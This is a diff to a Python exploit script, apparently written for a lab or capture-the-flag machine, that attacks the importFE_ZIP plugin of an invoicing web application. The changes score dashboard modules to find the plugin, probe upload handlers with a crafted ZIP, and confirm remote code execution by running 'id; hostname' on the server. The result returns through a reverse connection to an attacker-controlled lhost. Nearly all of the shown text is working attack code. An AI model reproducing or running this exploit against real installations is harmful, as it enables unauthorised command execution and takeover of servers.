@@ -86,19 +86,31 @@ def login(o, base, user, pw):
 
 
 # ---- plugin discovery ---------------------------------------------------
-def find_plugin(o, base):
+def find_plugins(o, base):
+    """Return ALL (mid, pid) candidates that look like the importFE_ZIP plugin,
+    strongest first. 'fattura' alone is too generic (it's an invoicing app), so
+    we require an import/FE-ZIP-specific marker and a real id_plugin."""
     home = get(o, base + "/index.php")
     mids = list(dict.fromkeys(re.findall(r"id_module=(\d+)", home)))
-    kw = ("importfe", "p7m", "fattura", "fe_zip", "importa fe")
+    strong = ("importfe", "fe_zip", "importa fe", "importazione fe", "blob1",
+              ".p7m", "p7m")
+    cands = []
     for mid in mids:
-        page = get(o, f"{base}/controller.php?id_module={mid}")
-        if any(k in page.lower() for k in kw):
-            pid = re.search(r"id_plugin=(\d+)", page)
-            pid = pid.group(1) if pid else "1"
-            log("+", f"importFE_ZIP module={mid} plugin={pid}")
-            return mid, pid
-    log("!", "importFE_ZIP module not found in dashboard")
-    return None, None
+        page = get(o, f"{base}/controller.php?id_module={mid}").lower()
+        score = sum(k in page for k in strong)
+        pids = re.findall(r"id_plugin=(\d+)", page)
+        if score and pids:
+            for pid in dict.fromkeys(pids):
+                cands.append((score, mid, pid))
+    cands.sort(reverse=True)
+    out = [(m, p) for _s, m, p in cands]
+    if out:
+        log("+", "importFE_ZIP candidates: "
+            + ", ".join(f"{m}/{p}" for m, p in out[:6]))
+    else:
+        log("!", "no importFE_ZIP module matched; will try scryer's known 14/21")
+        out = [("14", "21")]
+    return out
 
 
 # ---- payload / upload ---------------------------------------------------
@@ -220,18 +232,41 @@ def main():
     o = session()
     if not login(o, base, user, pw):
         sys.exit(2)
-    mid, pid = find_plugin(o, base)
-    if not mid:
-        sys.exit(3)
 
-    log("*", "confirming code execution (reverse-exec: id; hostname) …")
+    # explicit module/plugin override: argv[5]=module argv[6]=plugin
+    if len(sys.argv) > 6:
+        cands = [(sys.argv[5], sys.argv[6])]
+        log("*", f"using given module/plugin {cands[0][0]}/{cands[0][1]}")
+    else:
+        cands = find_plugins(o, base)
+
+    # find the module whose save handler actually accepts the ZIP: a correct
+    # upload echoes {"id":1}; a wrong module returns empty; a non-Automatico
+    # install returns empty too (that needs an extra trigger — see below).
+    mid = pid = None
+    for m, p in cands[:8]:
+        st, resp = upload(o, base, m, p, "id")
+        body = resp.strip()
+        log(".", f"module {m}/{p}: upload HTTP {st}, body {body[:120]!r}")
+        if '"id"' in body or "id:1" in body or "id" == body[:2] and "1" in body:
+            mid, pid = m, p
+            log("+", f"save handler accepts the ZIP on module {m}/{p} (Automatico on)")
+            break
+    if not mid:
+        log("!", "no module returned {\"id\":1}. Either the import method isn't "
+                 "'Automatico' (save won't process — needs a manual trigger), or "
+                 "the module id differs. Trying reverse-exec on the top candidate "
+                 "anyway…")
+        mid, pid = cands[0]
+
+    log("*", f"confirming code execution on {mid}/{pid} (reverse-exec: id; hostname) …")
     probe = run_cmd(o, base, mid, pid, lhost, "id; hostname")
     if "uid=" not in probe:
-        log("!", "no callback / no exec. Diagnostics from the upload response:")
-        st, resp = upload(o, base, mid, pid, "id")
-        log(".", f"upload HTTP {st}; body: {resp[:300].strip()!r}")
-        log(".", "if body shows 'only ZIP'/an error, the save path differs; if it "
-                 "shows id:1 the exec fired but couldn't reach us (LHOST/firewall)")
+        log("!", "no callback. The exec either didn't fire or couldn't reach us.")
+        log(".", f"lhost used: {lhost} — if your VPN iface isn't this, pass it: "
+                 f"python3 {sys.argv[0]} {base} {user} {pw} <YOUR_TUN0_IP>")
+        log(".", "next: confirm the box can reach you — on the target's shell a "
+                 "reverse connection to your VPN IP must be allowed.")
         sys.exit(4)
     log("+", "RCE confirmed:")
     for ln in probe.strip().splitlines():
